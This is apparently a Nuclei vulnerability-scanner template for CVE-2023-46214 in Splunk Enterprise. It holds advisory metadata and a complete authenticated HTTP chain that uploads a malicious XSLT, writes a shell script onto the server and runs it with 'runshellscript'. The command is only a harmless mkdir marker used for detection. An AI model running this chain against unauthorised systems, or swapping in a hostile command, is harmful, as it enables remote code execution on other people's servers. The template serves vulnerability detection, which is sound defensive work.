id: CVE-2023-46214

info:
  name: Splunk Enterprise < 9.1.2 - XML Injection
  author: jackhax
  severity: high
  description: |
    In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.
  impact: |
    Successful exploitation of this vulnerability could allow an authenticated attacker to perform remote code execution.
  remediation: |
    Upgrade Splunk Enterprise to either 9.0.7 or 9.1.2. Or limit the ability of search job requests to accept XSL as valid input.
  reference:
    - https://advisory.splunk.com/advisories/SVD-2023-1104
    - https://github.com/nathan31337/Splunk-RCE-poc
    - https://nvd.nist.gov/vuln/detail/CVE-2023-46214
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-46214
    cwe-id: CWE-91
    epss-score: 0.05
    epss-percentile: 0.129
    cpe: cpe:2.3:a:splunk:splunk:*:*:*:*:enterprise:*:*:*
  metadata:
    verified: true
    max-request: 13
    vendor: Splunk
    product: Splunk Enterprise
  tags: cve2023,cve,rce,splunk,xml

variables:
  randint: "{{rand_int(1000000000,9999999999)}}"
  filename: "{{rand_base(6)}}"

http:
  - raw:
      - |
        GET /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1
        Host: {{Hostname}}

    redirects: true
    extractors:
      - type: kval
        name: cval
        part: cookie
        kval:
          - "cval"
        internal: true

  - raw:
      - |
        POST /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false

    redirects: true
    extractors:
      - type: kval
        name: csrf_1
        part: cookie
        kval:
          - "splunkweb_csrf_token_8000"
        internal: true

  - raw:
      - |
        POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path={{filename}}.xsl HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=8d047bf6a7fc6ed1e8a2d789c657e3af
        X-Requested-With: XMLHttpRequest
        X-Splunk-Form-Key: {{csrf_1}}

        --8d047bf6a7fc6ed1e8a2d789c657e3af
        Content-Disposition: form-data; name="spl-file"; filename="{{filename}}.xsl"
        Content-Type: application/xslt+xml

        <?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
          <xsl:template match="/">
            <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
                <xsl:text>mkdir /opt/splunk/var/run/splunk/dispatch/{{randint}}</xsl:text>
            </exsl:document>
          </xsl:template>
        </xsl:stylesheet>
        --8d047bf6a7fc6ed1e8a2d789c657e3af--

    extractors:
      - type: json
        part: body
        name: text_value
        json:
          - '.messages[0].text'
        internal: true

  - raw:
      - |
        POST /en-US/splunkd/__raw/servicesNS/{{username}}/search/search/jobs?output_mode=json HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        X-Splunk-Form-Key: "{{csrf_1}}"
        Content-Type: application/x-www-form-urlencoded

        search=%7Csearch+test%7Chead+1

    extractors:
      - type: json
        part: body
        name: jsid
        json:
          - '.sid'
        internal: true

  - raw:
      - |
        POST /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false

    redirects: true
    extractors:
      - type: kval
        name: csrf_2
        part: cookie
        kval:
          - "splunkweb_csrf_token_8000"
        internal: true

  - raw:
      - |
        GET /en-US/api/search/jobs/{{jsid}}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{{text_value}}/{{filename}}.xsl HTTP/1.1
        Host: {{Hostname}}
        X-Splunk-Module: Splunk.Module.DispatchingModule
        X-Requested-With: XMLHttpRequest

  - raw:
      - |
        POST /en-US/splunkd/__raw/servicesNS/{{username}}/search/search/jobs HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        X-Splunk-Form-Key: "{{csrf_2}}"

        search=|runshellscript "shell.sh" "" "" "" "" "" "" "" "{{jsid}}"

    extractors:
      - type: xpath
        name: sid
        xpath:
          - '//sid/text()'
        internal: true

  - raw:
      - |
        POST /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cval={{cval}}&username={{username}}&password={{password}}&set_has_logged_in=false

    redirects: true
    extractors:
      - type: kval
        name: csrf_3
        part: cookie
        kval:
          - "splunkweb_csrf_token_8000"
        internal: true

  - raw:
      - |
        GET /en-US/splunkd/__raw/services/search/jobs/{{randint}}/search.log HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '{{randint}}'

      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - 'FATAL'
          - 'ERROR'
        negative: true
